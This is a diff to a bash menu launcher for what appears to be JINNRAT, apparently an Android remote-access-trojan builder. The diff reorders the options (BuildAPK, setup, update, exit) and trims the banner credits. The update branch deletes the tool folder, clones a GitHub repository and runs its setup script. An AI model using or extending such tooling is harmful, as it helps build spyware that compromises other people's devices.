@@ -20,18 +20,18 @@ echo '''
 ╚█████╔╝██║██║ ╚████║██║ ╚████║██║  ██║██║  ██║   ██║   V 1.01
  ╚════╝ ╚═╝╚═╝  ╚═══╝╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝
 
-                   𝕓𝕪 alvinbaby (MRJINN)
-     ₹____________________<😈>_____________________₹
-                         MRJINN 
-       [ Telegram : https://t.me/MrJinnTelegram ]
-      ₹___________________________________________₹
+                   𝕓𝕪 alvinbaby
 ''' | lolcat
+
 echo " "
-echo -e "     $Purple==>$Yellow[1️⃣] Start index.js $Green  "
-echo -e "     $Purple==>️$Yellow[2️⃣] BuildAPK $Green        "
-echo -e "     $Purple==>$Yellow[3️⃣] setup $Green           "
-echo -e "     $Purple==>$Yellow[4️⃣] Update $Green          "
-echo -e "     $Purple==>$Yellow[5️⃣] exit $Green            "                                                                           
+echo -e "     $Purple==>$Yellow[1️⃣] BuildAPK $Green  "
+
+echo -e "     $Purple==>️$Yellow[2️⃣] setup install $Green        "
+
+echo -e "     $Purple==>$Yellow[3️⃣] Update $Green           "
+
+echo -e "     $Purple==>$Yellow[4️⃣] exit $Green          "
+echo " "                                                                    
 echo " "
 echo " "
 
@@ -39,31 +39,25 @@ echo " "
    if [ $ch -eq 1 ];then
         cd $HOME
         cd JINNRAT
-        bash .jinn.sh
+        bash .BuildAPK
 
         exit
     elif [ $ch -eq 2 ];then
         cd $HOME
         cd JINNRAT
-        bash .BuildAPK
+        bash .setup.sh
 
         exit
     elif [ $ch -eq 3 ];then
-        cd $HOME
-        cd JINNRAT
-        bash setup.sh
-
-        exit
-    elif [ $ch -eq 4 ];then
         echo -e "\e[1;34m Downloading Latest Files..."
         cd $HOME
         rm -rf JINNRAT
         git clone https://github.com/alvinbaby/JINNRAT
         cd JINNRAT
-        bash JINNRAT.sh
-     
+        bash setup.sh
+
         exit
-    elif [ $ch -eq 5 ];then
+    elif [ $ch -eq 4 ];then
         echo -e 
         cd $HOME
 
